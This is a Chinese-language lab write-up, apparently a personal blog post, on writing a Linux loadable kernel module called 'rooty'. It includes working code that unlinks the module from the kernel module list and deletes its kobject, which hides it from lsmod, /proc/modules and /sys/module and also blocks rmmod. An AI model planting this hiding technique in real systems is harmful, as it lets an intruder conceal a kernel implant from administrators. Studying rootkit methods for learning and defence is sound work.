# Linux rootkit实验 | 0001 LKM 加载

> 本来早就打算做一个这个系列的记录，但是一直都给弃坑了，趁今天老师讲完，自己私下离研究一下，争取弄懂这个知识点。
>
> 实验环境: 
>
> root@kali:~# uname -a 
> Linux kali 4.18.0-kali2-amd64 #1 SMP Debian 4.18.10-2kali1 (2018-10-09) x86_64 GNU/Linux

## 1 LKM

`Loadable Kernel Modules`可加载内核模块，主要是用来扩展Linux内核的功能。可以动态地加载到内存中，无需重新编译内核.

通过实验学习LKM模块的编写和加载，以及如何初步的 隐藏模块，包括：

1. 对lsmod 隐藏
2. 对/proc/modules 隐藏
3. 对/sys/module 隐藏

## 2 实验过程

```c
/**
 * 一个最简单的系统模块
 * rooty.c
 */
#include <linux/module.h>	//模块头文件
#include <linux/init.h>		//使用的宏文件
#include <linux/kernel.h>	//KERN_INFO在这里
// LICENSE
MODULE_LICENSE("GPL");
// 作者
MODULE_AUTHOR("chanshaw");
//描述
MODULE_DESCRIPTION("It's a rootkit lkm");
//版本
MODULE_VERSION("0.1");

static int rooty_init(void) {
    printk("rooty: module loaded\n");
    return 0;
}

static void  rooty_exit(void) {
    printk("rooty: module removed\n");
}

module_init(rooty_init);
module_exit(rooty_exit);
```

### 2.1 代码解释

这个模块在初始化的时候，将`rooty:module loaded`打印到内核缓冲区，并在模块删除的时候，打印`rooty: module removed`。内核中无法调用C库函数，所以不能使用`printf`输出，要用内核导出的`printk`将内容记录到系统日志中。

所以不难理解这个程序主要有两部分代码组成，一部分为`module_init(rooty_init)`，这个有点想我们面对对象编程的时候写的构造函数，同样与之对应的是`module_exit(rooty_exit)`,这个就是于我们的析构函数对应的。

### 2.2 Makefile

```makefile
obj-m = rooty.o
all:
	make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
# make命令前是tab，不是空格
```

`obj-m`表示我们正在从对象创建模块，现在可以使用make来编译或者清理用来伤处编译过程中生成的文件。

### 2.3 编译以及模块操作

#### 编译`rooty.c`:

在文件夹下`make`即可

```shell
root@kali:~/Documents/rootkit# make
make -C /lib/modules/4.19.0-kali3-amd64/build/ M=/root/Documents/rootkit modules
make[1]: 进入目录“/usr/src/linux-headers-4.19.0-kali3-amd64”
  CC [M]  /root/Documents/rootkit/rooty.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /root/Documents/rootkit/rooty.mod.o
  LD [M]  /root/Documents/rootkit/rooty.ko
make[1]: 离开目录“/usr/src/linux-headers-4.19.0-kali3-amd64”
```

#### 查看模块信息:

使用`modinfo`指令：

```shell
root@kali:~/Documents/rootkit# modinfo rooty.ko
filename:       /root/Documents/rootkit/rooty.ko
version:        0.1
description:    It's a rootkit lkm
author:         chanshaw
license:        GPL
srcversion:     6084592AB4626A083A7446F
depends:        
retpoline:      Y
name:           rooty
vermagic:       4.19.0-kali3-amd64 SMP mod_unload modversions 
```

#### 模块操作：

使用`insmod rooty.ko`加载模块

然后通过`dmesg | tatil -n 10`查看加载信息:

```shell
root@kali:~/Documents/rootkit# dmesg | tail -n 10
[56753.551611] IPv6: ADDRCONF(NETDEV_CHANGE): eth0: link becomes ready
[56753.560390] usb 2-2.1: New USB device found, idVendor=0e0f, idProduct=0008, bcdDevice= 1.00
[56753.560393] usb 2-2.1: New USB device strings: Mfr=1, Product=2, SerialNumber=3
[56753.560396] usb 2-2.1: Product: Virtual Bluetooth Adapter
[56753.560398] usb 2-2.1: Manufacturer: VMware
[56753.560400] usb 2-2.1: SerialNumber: 000650268328
[57731.899954] usb 2-2.1: reset full-speed USB device number 7 using uhci_hcd
[60903.403630] usb 2-2.1: reset full-speed USB device number 7 using uhci_hcd
[63702.217634] rooty: loading out-of-tree module taints kernel.
[63702.233369] rooty: module loaded
```

通过`lsmod`查看模块

```shell
root@kali:~/Documents/rootkit# lsmod |grep rooty
rooty                  16384  0
```

前者是模块大小，后者是模块使用次数，可以看到，我们的模块大小是16384，一次都未使用

使用`rmmod rooty.ko`卸载模块:

```shell
root@kali:~/Documents/rootkit# rmmod rooty.ko
root@kali:~/Documents/rootkit# dmesg | tail -n 10
[56753.560390] usb 2-2.1: New USB device found, idVendor=0e0f, idProduct=0008, bcdDevice= 1.00
[56753.560393] usb 2-2.1: New USB device strings: Mfr=1, Product=2, SerialNumber=3
[56753.560396] usb 2-2.1: Product: Virtual Bluetooth Adapter
[56753.560398] usb 2-2.1: Manufacturer: VMware
[56753.560400] usb 2-2.1: SerialNumber: 000650268328
[57731.899954] usb 2-2.1: reset full-speed USB device number 7 using uhci_hcd
[60903.403630] usb 2-2.1: reset full-speed USB device number 7 using uhci_hcd
[63702.217634] rooty: loading out-of-tree module taints kernel.
[63702.233369] rooty: module loaded
[63792.257348] rooty: module removed
```

至此，系统模块相关的内容已经介绍完毕

## 3 模块隐藏

现在我们要做的是，虽然这个模块是正常工作的，但是我们要使得它不被别人察觉到，也就是，不管我们是在使用`dmesg`命令还是`lsmod`命令，都不会察觉到它。

- 对于`dmesg`命令，只需要简单的不适用`printk()`函数就好。
- 对于`lsmod`命令，它是通过读取`/proc/modules`来发挥作用，但同时在`sys/module/`中也能查看

### 3.1 `/proc/modules`隐藏

`lsmod`命令通过`/proc/modules`中的当前系统模块信息是内核在利用`struct modules`结构体的表头遍历整个内核模块链表、从所有的模块的`struct module`结构体总获取模块的相关位置信息得到的.

首先，为了使得在使用`lsmod`的时候无法找到我们的模块，我们需要知道如下信息：

**`lsmod`命令通过查看`/proc/mpdules`文件来工作**。

所以，我们需要在`＆__ this_module.list`上调用`list_del_init`方法，这个函数调用`__list_del_entry`并且是基于`__list_del`，有关这三个函数的源码都在`include/linux/list.h`中。源码如下:

```c
/**
 * list_del_init - deletes entry from list and reinitialize it.
 * @entry: the element to delete from the list.
 */
static inline void list_del_init(struct list_head *entry)
{
	__list_del_entry(entry);
	INIT_LIST_HEAD(entry);
}

/**
 * list_del - deletes entry from list.
 * @entry: the element to delete from the list.
 * Note: list_empty() on entry does not return true after this, the entry is
 * in an undefined state.
 */
static inline void __list_del_entry(struct list_head *entry)
{
	if (!__list_del_entry_valid(entry))
		return;

	__list_del(entry->prev, entry->next);
}

static inline void list_del(struct list_head *entry)
{
	__list_del_entry(entry);
	entry->next = LIST_POISON1;
	entry->prev = LIST_POISON2;
}
```

在模块删除之后，我们还需要重新初始化这个列表，使用的方法是`INIT_LIST_HEAD(entry)`,源码很好理解；

```c
static inline void INIT_LIST_HEAD(struct list_head *list)
{
	WRITE_ONCE(list->next, list); //list-> next = list;
	list->prev = list;
}
```

现在我们将`list_del_init(&__this_module.list)；`加入到我们的初始化函数中，保存，编译，装载模块，再输入`lsmod`就会发现找不到我们的模块了。

```c
static int rooty_init(void) {
    list_del_init(&__this_module.list);
    //printk("rooty: module loaded\n");
    return 0;
}
```

效果:

```shell
root@kali:~/Documents/rootkit# insmod rooty.ko
root@kali:~/Documents/rootkit# lsmod |grep rooty
root@kali:~/Documents/rootkit# modinfo rooty
modinfo: ERROR: Module rooty not found.
root@kali:~/Documents/rootkit# ls /sys/module/ |grep rooty
rooty
```

`lsmod`已经没法找到它了，但是在`/sys/module/`中依然存在:

### 3.2 `sys/module`隐藏

`sys/module`c存有加载内核对象的一般信息（比如参数）。所以通过查看`sysfs`也就是`sys/module`目录来发现现有模块是可行的。

`sysfs`是一个基于`ram`的文件系统，这个文件系统不仅可以把设备（devices）和驱动程序（drivers）的信息从内核输出到用户空间，也可以用来对设备和驱动程序做设置。通常，`sysfs`是挂在在/sys目录下的:

而`/sys/module`是一个`sysfs`的一个目录层次, 包含当前加载模块的信息.。`sysfs`与`kobject`层次紧密相连，它将`kobject`层次关系表现出来，使得用户空间可以看见这些层次关系。其中`kobj`是一个`struct kobject`结构体，而`kobject`是组成设备模型的基本结构。

所以原理大概是同上，我们通过`kobject_del()`函数删除我们当前模块的`kobject`就可以起到在`/sys/module`中隐藏`lkm`的作用。

代码:`kobject_del(&THIS_MODULE->mkobj.kobj);`

`&THIS_MODULE`的定义在`include/llinux/export.h`中，源码如下：

```c
extern struct module __this_module;
#define THIS_MODULE (&__this_module)
#else
#define THIS_MODULE ((struct module *)0)
```

可以看出THIS_MODULE的作用是指向当前模块。`&THIS_MODULE->mkobj.kobj`则代表的是struct module结构体的成员`struct module_kobject`的一部分，结构体的定义如下：

```c
struct module_kobject {
	struct kobject kobj;
	struct module *mod;
	struct kobject *drivers_dir;
	struct module_param_attrs *mp;
	struct completion *kobj_completion;
} __randomize_layout;
```

代码如下:

```c
static int __init rooty_init(void) {
    list_del_init(&__this_module.list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    printk("rooty: module loaded\n");
    return 0;
}
```

结果：

```shell
root@kali:~/Documents/rootkit# insmod rooty.ko
root@kali:~/Documents/rootkit# lsmod |grep rooty.ko
root@kali:~/Documents/rootkit# modinfo rooty
modinfo: ERROR: Module rooty not found.
root@kali:~/Documents/rootkit# ls /sys/module|grep rooty
root@kali:~/Documents/rootkit# modprobe -c |grep rooty
root@kali:~/Documents/rootkit# grep rooty /proc/kallsyms 
```

我们无法找到有关模块`rooty.ko`的任何信息，需要注意的是，我们也无法像正常模块一样使用`rmmod`命令移除它。

## 总结&问题

### 总结：

1. 学习了如何写内核模块
2. 学习了内核加载&卸载
3. 知道了如何查看内核信息
4. 学习了隐藏内核模块的方法

### 问题：

1. 最后隐藏的模块无法通过`rmmod`来卸载，那么我们该如何卸载它
2. Makefile的内容是什么
3. make之后生成了其他的文件，他们有什么作用

## 参考资料

- [Modern Linux Rootkits 101](<https://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html?view=sidebar>)
- [编写第一个linux内核模块](<http://blog.topspeedsnail.com/archives/10053>)
- [Linux Rootkit系列一：LKM的基础编写及隐藏](<https://www.freebuf.com/articles/system/54263.html>)
- [Linux Rootkit 实验 | 0000 LKM 的基础编写&隐藏](<https://wohin.me/rootkit/2017/05/07/LinuxRootkitExp-0000.html>)

